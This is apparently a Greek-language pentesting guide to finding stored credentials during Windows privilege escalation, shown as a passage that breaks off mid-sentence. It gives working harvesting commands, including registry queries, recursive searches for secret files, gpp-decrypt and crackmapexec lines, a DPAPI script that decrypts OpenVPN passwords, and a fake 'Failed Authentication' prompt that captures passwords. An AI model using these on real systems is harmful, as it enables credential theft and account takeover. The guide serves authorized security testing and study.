Ορισμένα plugins διακομιστών Java διανέμονται ως αρχεία JAR στον κατάλογο `plugins` ενός διακομιστή. Ένα αναγνώσιμο προσαρμοσμένο plugin μπορεί να περιέχει ρυθμίσεις ή bytecode με ενσωματωμένο διαπιστευτήριο υπηρεσίας. Εξετάζετε το αρχείο μόνο εφόσον έχετε εξουσιοδότηση και μην εμφανίζετε ανακτημένα μυστικά σε συνήθη έξοδο απαρίθμησης. Μια διαδρομή plugin από μόνη της δεν αποδεικνύει ότι υπάρχει μυστικό, ενώ ένας ανακτημένος κωδικός πρόσβασης υπηρεσίας οδηγεί σε υψηλότερα προνόμια μόνο αν ισχύει και για έναν λογαριασμό με περισσότερα προνόμια. Ελέγξτε τα σχετικά ACL αρχείων και αντικαταστήστε τους επαναχρησιμοποιημένους κωδικούς πρόσβασης με ξεχωριστά μυστικά. Δείτε τον [οδηγό εγκατάστασης plugin του PaperMC](https://docs.papermc.io/paper/adding-plugins/) για τη διάταξη καταλόγων και την [τεκμηρίωση JAR της Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) για τα περιεχόμενα του αρχείου.

### Διαπιστευτήρια ενσωματωμένης βάσης δεδομένων Openfire

Μια εγκατάσταση Openfire που χρησιμοποιεί την ενσωματωμένη βάση δεδομένων της μπορεί να διατηρεί το `openfire.script` κάτω από το `Openfire\embedded-db`. Αν ο τρέχων λογαριασμός μπορεί να το διαβάσει, εξετάστε μαζί τις εγγραφές `OFUSER` και την ιδιότητα `passwordKey`. Η [τεκμηρίωση παρόχου χρηστών](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) του Openfire αναφέρει ότι οι κωδικοί πρόσβασης μπορούν να αποθηκεύονται ως απλό κείμενο ή κρυπτογραφημένοι με κλειδί που βρίσκεται σε αυτή την ιδιότητα. Ένας ανακτημένος κωδικός πρόσβασης έχει σημασία για κλιμάκωση προνομίων μόνο αν εξακολουθεί να ισχύει για μια ταυτότητα με περισσότερα προνόμια· το όνομα του αρχείου από μόνο του δεν αποδεικνύει ούτε πρόσβαση ανάγνωσης ούτε επαναχρησιμοποίηση διαπιστευτηρίων. Η διαδρομή αποτελεί ένδειξη για απογραφή, γι' αυτό μην εμφανίζετε περιεχόμενο βάσης δεδομένων και διαπιστευτήρια σε συνήθη έξοδο απαρίθμησης.

Το ξεχωριστό αρχείο `Openfire\conf\openfire.xml` μπορεί να αποκαλύψει τις διαμορφωμένες θύρες και τη διεπαφή bind της κονσόλας διαχειριστή, ακόμη κι όταν χρησιμοποιείται εξωτερική βάση δεδομένων. Το Openfire συνήθως κάνει bind την κονσόλα διαχειριστή στο loopback· αυτό εξακολουθεί να επιτρέπει σε έναν τοπικό λογαριασμό να προσπελάσει τη διεύθυνση, αν ο listener εκτελείται. Ελέγξτε μαζί τον πραγματικό listener, τον εξουσιοδοτημένο ρόλο διαχειριστή, την πολιτική μεταφόρτωσης plugin και την ταυτότητα υπηρεσίας του Openfire. Ένας διαχειριστής που μπορεί να εγκαταστήσει plugin ενδέχεται να εκτελέσει κώδικα plugin στο περιβάλλον της υπηρεσίας, κάτι που μπορεί να παρέχει υψηλά προνόμια όταν η υπηρεσία εκτελείται ως LocalSystem. Ένας κωδικός πρόσβασης που ταιριάζει ή μια αναγνώσιμη διαδρομή ρυθμίσεων από μόνα τους δεν αποδεικνύουν πρόσβαση στην κονσόλα διαχειριστή ή εκτέλεση κώδικα. Δείτε τον [οδηγό εγκατάστασης και διαχείρισης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) του προμηθευτή και την [ιδιότητα API μεταφόρτωσης plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Ρυθμίσεις διακομιστή διαχείρισης forensics

Οι ρυθμίσεις διακομιστή Velociraptor, που συνήθως ονομάζονται `server.config.yaml`, μπορεί να περιέχουν το `CA.private_key` της εσωτερικής CA. Αν ένας χρήστης με χαμηλότερα προνόμια μπορεί να διαβάσει αυτό το κλειδί, ενδέχεται να μπορεί να δημιουργήσει πιστοποιητικό API client. Το αν αυτό οδηγεί σε υψηλότερα προνόμια εξαρτάται από τους ρόλους χρηστών του διακομιστή, την προσβασιμότητα του API και την ταυτότητα με την οποία εκτελείται ο διακομιστής ή ο agent-στόχος. Ένα client configuration περιέχει διαφορετικό υλικό· η εύρεσή του δεν αποδεικνύει πρόσβαση στην CA του διακομιστή. Ορισμένες εγκαταστάσεις διατηρούν το ιδιωτικό κλειδί της CA εκτός σύνδεσης, επομένως μια αναγνώσιμη ρύθμιση διακομιστή μπορεί να μην περιέχει το κλειδί υπογραφής.

Σε έναν διακομιστή Windows, ελέγξτε τα ACL της ρύθμισης **του διακομιστή** στον κατάλογο εγκατάστασής του και τυχόν προστατευμένα αντίγραφα ασφαλείας. Μια πιθανή τοποθεσία είναι η `%ProgramFiles%\VelociraptorServer\server.config.yaml`· χρησιμοποιήστε τη διαδρομή που έχει ρυθμιστεί για την υπηρεσία, αν διαφέρει. Επιβεβαιώστε ότι η τρέχουσα ταυτότητα μπορεί να διαβάσει το αρχείο και ότι το `CA.private_key` υπάρχει πράγματι. Μην εμφανίζετε το ιδιωτικό κλειδί σε logs ή έξοδο απαρίθμησης. Η ροή εργασίας `config api_client` του προμηθευτή χρησιμοποιεί το κλειδί CA για την έκδοση πιστοποιητικού client, αλλά απαιτείται επίσης ένας αποτελεσματικός ρόλος στην πλευρά του διακομιστή· η δημιουργία ή η αλλαγή του μπορεί να απαιτεί πρόσβαση εγγραφής στο datastore ή επανεκκίνηση. Μια υπάρχουσα ταυτότητα διακομιστή με προνόμια μπορεί να παρέχει διαδρομή ακόμη κι όταν αυτές οι εγγραφές δεν είναι διαθέσιμες. Τα ερωτήματα API με δικαιώματα εκτέλεσης εκτελούνται στο σχετικό περιβάλλον διακομιστή ή agent, το οποίο μπορεί να έχει υψηλά προνόμια.

Προστατεύετε τη ρύθμιση διακομιστή και τα αντίγραφα ασφαλείας με περιοριστικά ACL, διατηρείτε το κλειδί υπογραφής της CA εκτός σύνδεσης όπου είναι δυνατό και περιορίζετε τους ρόλους API και την πρόσβαση στους listeners. Δείτε την [τεκμηρίωση API του Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) και τις [οδηγίες ρυθμίσεων ασφαλείας](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY είναι ένας ξεχωριστός διαχειριστής συνεδριών. Το εγγενές κρυπτογραφημένο αρχείο αποθήκευσης μπορεί να βρίσκεται στη διαδρομή `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, ενώ ένα εξαγόμενο αντίγραφο ασφαλείας συνεδριών μπορεί να ονομάζεται `sessions-backup.dat` και να είναι αποθηκευμένο αλλού. Ο [SolarWinds' export guide](https://thwack.solarwinds.com/discussion/comment/115591) αναφέρει ότι οι εξαγωγές είναι κρυπτογραφημένες με κωδικό πρόσβασης και μπορούν να περιέχουν συνεδρίες, κλειδιά, scripts, tags και συσχετίσεις· το [support forum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) προσδιορίζει το εγγενές αρχείο αποθήκευσης. Ελέγξτε πρώτα τα δικαιώματα αρχείων και τις διαδρομές. Ο εντοπισμός οποιουδήποτε από τα δύο αρχεία δεν αποκαλύπτει τον κωδικό πρόσβασής του ούτε αποδεικνύει ότι τυχόν αποθηκευμένα διαπιστευτήρια εξακολουθούν να είναι έγκυρα ή να έχουν υψηλότερα προνόμια.

### Κλειδιά κεντρικού υπολογιστή SSH του PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys στο registry

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκεύονται στο κλειδί registry `HKCU\Software\OpenSSH\Agent\Keys`, επομένως θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Αν βρείτε κάποια εγγραφή μέσα σε αυτή τη διαδρομή, πιθανότατα πρόκειται για αποθηκευμένο SSH key. Είναι κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα με το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες για αυτή την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν ισχύει πλέον. Προσπάθησα να δημιουργήσω μερικά ssh keys, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε χρήση του `dpapi.dll` κατά την πιστοποίηση ταυτότητας με ασύμμετρο κλειδί.

### Αρχεία unattended

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Αντίγραφα ασφαλείας των SAM και SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Αναγνώσιμα αρχεία αντιγράφων ασφαλείας Windows Imaging (`.wim`) μπορεί επίσης να περιέχουν offline hives των `SAM`, `SECURITY` και `SYSTEM`. Δώστε προτεραιότητα σε τοπικά προσβάσιμους καταλόγους αντιγράφων ασφαλείας ή εικόνων και ελέγξτε τα **ονόματα των μελών** μιας εικόνας πριν από την εξαγωγή οτιδήποτε· το όνομα αρχείου `.wim` από μόνο του δεν αποδεικνύει ότι εκτίθενται hives, ενώ οι συνηθισμένες εικόνες `install.wim`, `boot.wim` και ανάκτησης είναι συχνά παραπλανητικές. Ένα SMB share αποτελεί ξεχωριστό τρόπο πρόσβασης και πρέπει να ελέγχεται μόνο όταν εμπίπτει στο πεδίο εφαρμογής. Δείτε τις οδηγίες της Microsoft για [Windows images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) και την [αναφορά αρχείων registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Διαπιστευτήρια Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με όνομα **SiteList.xml**

### Cached GPP Password

Υπήρχε παλαιότερα μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων τοπικών λογαριασμών διαχειριστή σε μια ομάδα μηχανημάτων μέσω του Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Πρώτον, τα Group Policy Objects (GPOs), αποθηκευμένα ως αρχεία XML στο SYSVOL, ήταν προσβάσιμα σε οποιονδήποτε χρήστη του domain. Δεύτερον, οποιοσδήποτε πιστοποιημένος χρήστης μπορούσε να αποκρυπτογραφήσει τους κωδικούς πρόσβασης μέσα σε αυτά τα GPP, οι οποίοι ήταν κρυπτογραφημένοι με AES256 χρησιμοποιώντας ένα δημοσίως τεκμηριωμένο προεπιλεγμένο κλειδί. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους χρήστες να αποκτήσουν αυξημένα προνόμια.

Για τον μετριασμό αυτού του κινδύνου, αναπτύχθηκε μια συνάρτηση που σαρώνει για τοπικά αποθηκευμένα αρχεία GPP τα οποία περιέχουν ένα πεδίο "cpassword" με μη κενή τιμή. Όταν εντοπίζει ένα τέτοιο αρχείο, η συνάρτηση αποκρυπτογραφεί τον κωδικό πρόσβασης και επιστρέφει ένα προσαρμοσμένο αντικείμενο PowerShell. Το αντικείμενο περιλαμβάνει λεπτομέρειες για το GPP και τη θέση του αρχείου, διευκολύνοντας τον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε αυτά τα αρχεία στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Ρύθμιση παραμέτρων Web του IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Παράδειγμα web.config με διαπιστευτήρια:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Αντίγραφα ασφαλείας σε ZIP στο webroot του IIS

Ένα παλιό αντίγραφο ασφαλείας σε ZIP, τοποθετημένο απευθείας σε webroot που εξυπηρετείται, μπορεί να αποκαλύψει παλαιότερα αρχεία ρυθμίσεων και επαναχρησιμοποιήσιμα διαπιστευτήρια. Ελέγξτε τη διαμορφωμένη φυσική διαδρομή του site και αν το αρχείο είναι πράγματι προσβάσιμο μέσω HTTP, προτού το θεωρήσετε έκθεση. Η προεπιλεγμένη διαδρομή `C:\inetpub\wwwroot` είναι απλώς μια πιθανότητα. Μια γρήγορη τοπική καταγραφή μπορεί να εμφανίσει ονόματα και μεγέθη χωρίς να ανοίξει τα αρχεία:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Το όνομα ενός αρχείου αρχειοθέτησης δεν αποδεικνύει ότι περιέχει κάποιο μυστικό ή ότι ένα διαπιστευτήριο που ανακτήθηκε παρέχει υψηλότερα προνόμια.

### Διαπιστευτήρια OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Καταγραφές

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμη και τα διαπιστευτήρια κάποιου άλλου χρήστη**, αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να ζητάτε απευθείας από τον πελάτη τα **διαπιστευτήριά** του είναι πραγματικά **επικίνδυνο**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που παλαιότερα περιείχαν **κωδικούς πρόσβασης** σε **απλό κείμενο** ή Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Οι βάσεις δεδομένων Password Safe v3 χρησιμοποιούν συνήθως την επέκταση `.psafe3`. Αντιμετωπίστε ένα αρχείο με αντίστοιχο όνομα ως πιθανό κρυπτογραφημένο θησαυροφυλάκιο· η παρουσία του δεν σημαίνει ότι μπορείτε να το διαβάσετε, να το ξεκλειδώσετε ή να χρησιμοποιήσετε τυχόν αποθηκευμένα διαπιστευτήρια. Κατά τον έλεγχο της αποθήκευσης τέτοιων αρχείων, εξετάστε τα προσβάσιμα προφίλ χρηστών και τις διαμορφωμένες ρίζες κοινής χρήσης αρχείων.

Ένα αναγνώσιμο αρχείο KeePass `.kdbx` αποτελεί επίσης απλώς ένδειξη ύπαρξης κρυπτογραφημένου θησαυροφυλακίου. Για να ξεκλειδωθεί, απαιτείται ο πραγματικός κύριος κωδικός πρόσβασης, καθώς και κάθε διαμορφωμένο αρχείο κλειδιού ή παράγοντας λογαριασμού. Αν ένας εξουσιοδοτημένος έλεγχος εντοπίσει σε κάποια εγγραφή ένα ζεύγος hash LM:NT, επαληθεύστε τον αναφερόμενο λογαριασμό και αν το NT hash είναι τρέχον και γίνεται αποδεκτό από την υπηρεσία NTLM του στόχου προτού εξετάσετε το [pass-the-hash](../ntlm/README.md#pass-the-hash). Μια εγγραφή στο θησαυροφυλάκιο δεν παρέχει από μόνη της δικαιώματα Administrator ή SYSTEM· πρέπει επίσης να ισχύουν η απομακρυσμένη πρόσβαση στην υπηρεσία, τα δικαιώματα του λογαριασμού και τυχόν ξεχωριστό βήμα εκτέλεσης υπηρεσίας. Η απογραφή πρέπει να αναφέρει τη διαδρομή του θησαυροφυλακίου και αν είναι αναγνώσιμο, όχι να εμφανίζει τη βάση δεδομένων ή τα αποθηκευμένα διαπιστευτήρια.

Αναζητήστε όλα τα προτεινόμενα αρχεία:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Διαπιστευτήρια στον Κάδο Ανακύκλωσης

Ελέγξτε τις προσβάσιμες εγγραφές του Κάδου Ανακύκλωσης για διαγραμμένα αντίγραφα ασφαλείας και αρχεία ρυθμίσεων, καθώς και για αρχεία των οποίων τα ονόματα αναφέρουν ρητά διαπιστευτήρια. Ένα χρήσιμο αντίγραφο ασφαλείας `.7z`, `.zip` ή `.rar` μπορεί να είναι μηνών και να έχει ένα συνηθισμένο όνομα αρχείου. Τα Windows αποθηκεύουν την αρχική διαδρομή και την ώρα διαγραφής σε μια εγγραφή `$I` και το διαγραμμένο αρχείο στην αντίστοιχη εγγραφή `$R`. Ελέγξτε τα μεταδεδομένα και αν η τρέχουσα ταυτότητα έχει δικαίωμα ανάγνωσης πριν ανοίξετε ένα αρχείο. Η ορατότητα εξαρτάται από τον τόμο, το SID του χρήστη και τα δικαιώματα αρχείων, επομένως μια κενή λίστα δεν αποδεικνύει ότι δεν υπάρχει ανακτήσιμο αντίγραφο ασφαλείας. Αντιμετωπίστε το όνομα ενός αρχείου ως υποψήφιο για έλεγχο, όχι ως απόδειξη ότι περιέχει έγκυρο μυστικό.

Ένα προσβάσιμο διαγραμμένο `.pfx` μπορεί επίσης να αποτελέσει ένδειξη για **υπογραφή κώδικα**. Αν περιέχει προσβάσιμο ιδιωτικό κλειδί, το κλειδί μπορεί να υπογράψει ένα τροποποιημένο PowerShell script· το [PowerShell απαιτεί πιστοποιητικό υπογραφής κώδικα με ιδιωτικό κλειδί](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), ενώ οι [κανόνες publisher του AppLocker αξιολογούν την ταυτότητα του υπογράφοντος και το πεδίο εφαρμογής του κανόνα](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Η εκτέλεση από άλλον λογαριασμό απαιτεί η τρέχουσα ταυτότητα να μπορεί να τροποποιήσει το συγκεκριμένο script, να ισχύει κανόνας που αποδέχεται την υπογραφή που προκύπτει για το script και τον λογαριασμό-στόχο, καθώς και μια προγραμματισμένη εργασία ή άλλη διεργασία με υψηλότερα δικαιώματα που πράγματι το εκτελεί. Ένα όνομα αρχείου `.pfx`, το θέμα ενός πιστοποιητικού ή ένα εγγράψιμο script από μόνο του δεν αποδεικνύει ότι ισχύει αυτή η αλυσίδα. Ελέγξτε τα μεταδεδομένα, τα ACL, την πολιτική και την εντολή της προγραμματισμένης εργασίας πριν ανοίξετε υλικό ιδιωτικού κλειδιού ή ενεργοποιήσετε την εργασία.

Ελέγξτε επίσης τις προσβάσιμες βάσεις δεδομένων προφίλ προγραμμάτων ανταλλαγής μηνυμάτων, τις σημειώσεις και τα ληφθέντα αρχεία για ενδείξεις διαπιστευτηρίων. Ένα export ανάκτησης BitLocker μπορεί να είναι αποθηκευμένο ως HTML ή TXT, μερικές φορές μέσα σε ένα επώνυμο αρχείο αντιγράφου ασφαλείας. Αυτό το υλικό μπορεί να παρέχει πρόσβαση σε ξεχωριστό κρυπτογραφημένο τόμο δεδομένων που περιέχει παλαιότερα αντίγραφα ασφαλείας· ελέγξτε τον τόμο και το αρχείο μόνο όταν έχετε εξουσιοδότηση. Αν ένα αντίγραφο ασφαλείας περιλαμβάνει `NTDS.dit`, η offline ανάκτηση διαπιστευτηρίων domain απαιτεί επίσης το αντίστοιχο hive `SYSTEM`, όπως περιγράφεται στη [ροή εργασίας αντιγράφων ασφαλείας και προνομιούχων ομάδων](../active-directory-methodology/privileged-groups-and-token-privileges.md). Τα ονόματα αρχείων και ένας κλειδωμένος τόμος από μόνα τους δεν αποδεικνύουν ότι υπάρχει χρησιμοποιήσιμο κλειδί ανάκτησης ή αντίγραφο ασφαλείας domain.

Για **ανάκτηση κωδικών πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα, μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Στο μητρώο

**Άλλα πιθανά κλειδιά μητρώου με διαπιστευτήρια**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Εξαγωγή κλειδιών openssh από το registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό προγραμμάτων περιήγησης

Θα πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται κωδικοί πρόσβασης από **Chrome, Edge ή Firefox**.\
Ελέγξτε επίσης το ιστορικό, τους σελιδοδείκτες και τα αγαπημένα των προγραμμάτων περιήγησης, καθώς μπορεί να έχουν αποθηκευτεί εκεί κάποιοι **κωδικοί πρόσβασης**.

Για το συμβατικό προφίλ **Default** του Edge του τρέχοντος χρήστη, το `Login Data` βρίσκεται στο `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ενώ το `Local State` βρίσκεται στον γονικό κατάλογο `User Data`. [Η Microsoft τεκμηριώνει την προεπιλεγμένη τοποθεσία του προφίλ](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars)· κάποιο άλλο προφίλ ή μια πολιτική `UserDataDir` μπορεί να την αλλάξει. Η ύπαρξη των αρχείων αποτελεί μόνο ένδειξη πιθανής αποθήκευσης διαπιστευτηρίων: επιβεβαιώστε ότι τα αρχεία είναι αναγνώσιμα, ότι διαθέτετε το DPAPI context του συγκεκριμένου χρήστη ή άλλο εξουσιοδοτημένο υλικό κλειδιών και ότι μια αποθηκευμένη σύνδεση ανήκει σε λογαριασμό με υψηλότερα προνόμια. Η απλή απαρίθμηση διαδρομών δεν απαιτεί το άνοιγμα της βάσης δεδομένων ούτε την εμφάνιση αποκρυπτογραφημένων κωδικών πρόσβασης.

Για το Firefox, [η Mozilla τεκμηριώνει](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) ότι τα `key4.db` και `logins.json` ενός προφίλ είναι τα αντίστοιχα αρχεία κλειδιών και κρυπτογραφημένων συνδέσεων. Η ύπαρξή τους αποτελεί μόνο ένδειξη: ελέγξτε αν είναι και τα δύο αναγνώσιμα, αν υπάρχουν αποθηκευμένες εγγραφές και αν ένας Primary Password προστατεύει το κλειδί, πριν συμπεράνετε ότι τα διαπιστευτήρια είναι αξιοποιήσιμα. Αν ένα ανακτημένο διαπιστευτήριο ανήκει σε λογαριασμό τομέα, ελέγξτε ξεχωριστά τα αποτελεσματικά δικαιώματα ελέγχου ομάδων αυτού του λογαριασμού και τα [δικαιώματα ανάγνωσης ή αποκρυπτογράφησης κωδικών πρόσβασης LAPS](../active-directory-methodology/laps.md) της ομάδας· τα browser artifacts από μόνα τους δεν αποδεικνύουν διαδρομή προς δικαιώματα 